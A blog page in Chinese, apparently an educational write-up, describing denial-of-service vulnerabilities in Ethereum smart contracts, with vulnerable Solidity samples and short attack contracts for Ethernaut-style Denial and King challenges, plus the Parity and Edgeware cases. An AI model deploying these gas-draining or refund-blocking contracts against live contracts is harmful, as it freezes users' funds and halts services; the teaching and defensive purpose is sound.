@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          拒绝服务漏洞 - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://dusign.net/Denial-Service/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('Iron-Man-3.jpg')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#基础漏洞" title="基础漏洞">基础漏洞</a>
+                            
+                        </div>
+                        <h1>拒绝服务漏洞</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2022-06-20
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">2.6k</span> and
+                                Reading Time <span class="post-count">10</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="合约中的拒绝服务漏洞："><a href="#合约中的拒绝服务漏洞：" class="headerlink" title="合约中的拒绝服务漏洞："></a>合约中的拒绝服务漏洞：</h1><hr>
+<pre><code>author：Thomas_Xu
+</code></pre><h2 id="何为Dos"><a href="#何为Dos" class="headerlink" title="何为Dos"></a>何为Dos</h2><p>DoS 是DenialOfService，拒绝服务的缩写[3]，从字面上来理解，就是用户所需要的服务请求无法被系统处理。<br>打个比方来形容DoS，火车站是为大家提供乘车服务的，如果想要DoS火车站的话，方法有很多，可以占用过道不上车，堵住售票点不付钱，阻挠列车员或者司机不让开车，甚至用破坏铁轨等更加极端的手段来影响车站服务的正常运营。<br>过去针对互联网的DoS有很多种方法，但基本分为三大类：利用软件实现的缺陷，利用协议的漏洞，利用资源压制[3]。<br>此外还有DDoS，称为分布式DoS，其区别就是攻击者利用远程操控的计算机同时向目标发起进攻，在上面的比喻中可以理解为雇佣了几百个地痞流氓来做同样的事影响车站的运作。</p>
+<h2 id="事件回顾"><a href="#事件回顾" class="headerlink" title="事件回顾"></a>事件回顾</h2><p>2016年2月6日至8日The King of the Ether Throne（以下简称KotET）“纷争时代”（Turbulent Age）期间，许多游戏中的退位君王的补偿和未接受款项无法退回用户玩家的钱包.<br>具有讽刺意味的是同年6月，连庞氏骗局GovernMental的合约也遭遇DoS攻击，当时1100以太币是通过使用250万gas交易获得[2]，这笔交易超出了合约能负荷的gas上限，带来交易活动的暂停。<br/><br>无论是蓄意破坏交易正常流程还是阻塞交易通道，都用到了一个互联网时代已经盛行已久的攻击方式——DoS，也就是我们所说的拒绝服务攻击。<br>这种攻击方式可以让合约执行的正常的交易操作被扰乱，中止，冻结，更严重的是让合约本身的逻辑无法运行</p>
+<h2 id="已知漏洞的类型"><a href="#已知漏洞的类型" class="headerlink" title="已知漏洞的类型"></a>已知漏洞的类型</h2><ol>
+<li>未设定gas费率的外部调用</li>
+<li>依赖外部的调用进展</li>
+<li>owner错误操作</li>
+<li>数组或映射过长</li>
+<li>逻辑设计错误</li>
+<li>缺少依赖库</li>
+</ol>
+<h2 id="未设定gas费率的外部调用"><a href="#未设定gas费率的外部调用" class="headerlink" title="未设定gas费率的外部调用"></a>未设定gas费率的外部调用</h2><p>在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"> </span><br><span class="line">contract Denial &#123;</span><br><span class="line"> </span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; &#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner &#x3D; address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address &#x3D;&gt; uint) withdrawPartnerBalances; &#x2F;&#x2F; keep track of partners balances</span><br><span class="line"> </span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner &#x3D; _partner;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend &#x3D; address(this).balance.div(100);</span><br><span class="line">        &#x2F;&#x2F; perform a call without checking return</span><br><span class="line">        &#x2F;&#x2F; The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call.value(amountToSend)(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        &#x2F;&#x2F; keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn &#x3D; now;</span><br><span class="line">        withdrawPartnerBalances[partner] &#x3D; withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; allow deposit of funds</span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line"> </span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        assert(0&#x3D;&#x3D;1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>解决方案<blockquote>
+<p>使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p>
+<h2 id="依赖外部的调用进展"><a href="#依赖外部的调用进展" class="headerlink" title="依赖外部的调用进展"></a>依赖外部的调用进展</h2><p>这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">contract King &#123;</span><br><span class="line"> </span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"> </span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"> </span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    constructor(address target) public payable&#123;</span><br><span class="line">        target.call.gas(1000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;未定义fallback函数，就没有payable修饰</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>解决方案</li>
+</ul>
+<h2 id="owner错误操作"><a href="#owner错误操作" class="headerlink" title="owner错误操作"></a>owner错误操作</h2><p>本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"> </span><br><span class="line">contract error&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool activestatus;</span><br><span class="line"> </span><br><span class="line">    modifier onlyowner&#123;</span><br><span class="line">        require(msg.sender&#x3D;&#x3D;owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier active&#123;</span><br><span class="line">        require(activestatus);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function activecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    function inactivecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer() active&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果owner调用了inactivecontract函数，使得activestatus变成false</p>
+<p>之后所有被active修饰的函数都无法调用，无法通过require判定</p>
+<p>令牌生态系统的整个操作取决于一个地址，这是非常危险的</p>
+<h2 id="数组或映射过长"><a href="#数组或映射过长" class="headerlink" title="数组或映射过长"></a>数组或映射过长</h2><p>本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; &#x2F;&#x2F; gets set somewhere</span><br><span class="line">    address[] investors; &#x2F;&#x2F; array of investors</span><br><span class="line">    uint[] investorTokens; &#x2F;&#x2F; the amount of tokens each investor gets</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; ... extra functionality, including transfertoken()</span><br><span class="line"> </span><br><span class="line">    function invest() public payable &#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * 5); &#x2F;&#x2F; 5 times the wei sent</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    function distribute() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner); &#x2F;&#x2F; only owner</span><br><span class="line">        for(uint i &#x3D; 0; i &lt; investors.length; i++) &#123; </span><br><span class="line">            &#x2F;&#x2F; here transferToken(to,amount) transfers &quot;amount&quot; of tokens to the address &quot;to&quot;</span><br><span class="line">            transferToken(investors[i],investorTokens[i]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>该漏洞的另一个关键点在于循环遍历的数组可以被人为扩充<br>在distribute()函数中使用的循环数组的扩充在invert()函数里面，但是invert()函数是public属性，也就意味着可以创建很多的用户账户，让数组变得非常大，从而使distribute()函数因为超出以太坊区块gas费率上限而无法成功执行</p>
+<h2 id="依赖库问题"><a href="#依赖库问题" class="headerlink" title="依赖库问题"></a>依赖库问题</h2><p>依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。</p>
+<p>万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p>
+<p>Parity 钱包遭受的第二次攻击是一个很好的例子。</p>
+<p>Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。</p>
+<p>库合约本质上也不过是另外一个智能合约，这次攻击调用使用的是库合约本身的上下文，对调用者而言这个库合约是未经初始化的。</p>
+<ul>
+<li><p>攻击流程</p>
+<p>1.攻击者调用初始化函数把自己设置为库合约的 owner。</p>
+<p>2.攻击者调用 kill() 函数，把库合约删除，所有的 ether 就被冻结了</p>
+</li>
+<li>解决方案<br>继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</li>
+</ul>
+<h2 id="逻辑设计错误"><a href="#逻辑设计错误" class="headerlink" title="逻辑设计错误"></a>逻辑设计错误</h2><p>本类型漏洞分析Edgeware锁仓合约的拒绝服务漏洞</p>
+<p>Edgeware锁仓合约可以理解为你往银行里定期存款，之后会给你收益，关键点在于发送token后要进行lock操作，把你的资金锁起来，暂时无法提现，本类型漏洞会导致参与者lock失败，从而无法获得收益。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function lock(Term term, bytes calldata edgewareAddr, bool isValidator)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        didStart</span><br><span class="line">        didNotEnd</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 eth &#x3D; msg.value;</span><br><span class="line">        address owner &#x3D; msg.sender;</span><br><span class="line">        uint256 unlockTime &#x3D; unlockTimeForTerm(term);</span><br><span class="line">        &#x2F;&#x2F; Create ETH lock contract</span><br><span class="line">        Lock lockAddr &#x3D; (new Lock).value(eth)(owner, unlockTime);</span><br><span class="line">        &#x2F;&#x2F; ensure lock contract has at least all the ETH, or fail</span><br><span class="line">        assert(address(lockAddr).balance &gt;&#x3D; msg.value);</span><br><span class="line">        emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这段代码做了强制判断:<br><code>assert(address(lockAddr).balance &gt;= msg.value);</code><br>属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的 Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。 但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value” 攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock 合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益</p>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2022-11-03-ethernaut01/" data-toggle="tooltip" data-placement="top" title="ethernaut 题解 01-06">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/CallAttack/" data-toggle="tooltip" data-placement="top" title="Call注入漏洞">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="/js/music-player/utill.js"></script>
+
+
+<script src="/js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="/js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#合约中的拒绝服务漏洞："><span class="toc-nav-number">1.</span> <span class="toc-nav-text">合约中的拒绝服务漏洞：</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#何为Dos"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">何为Dos</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#事件回顾"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">事件回顾</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#已知漏洞的类型"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">已知漏洞的类型</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#未设定gas费率的外部调用"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">未设定gas费率的外部调用</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#依赖外部的调用进展"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">依赖外部的调用进展</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#owner错误操作"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">owner错误操作</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#数组或映射过长"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">数组或映射过长</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#依赖库问题"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">依赖库问题</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#逻辑设计错误"><span class="toc-nav-number">1.9.</span> <span class="toc-nav-text">逻辑设计错误</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
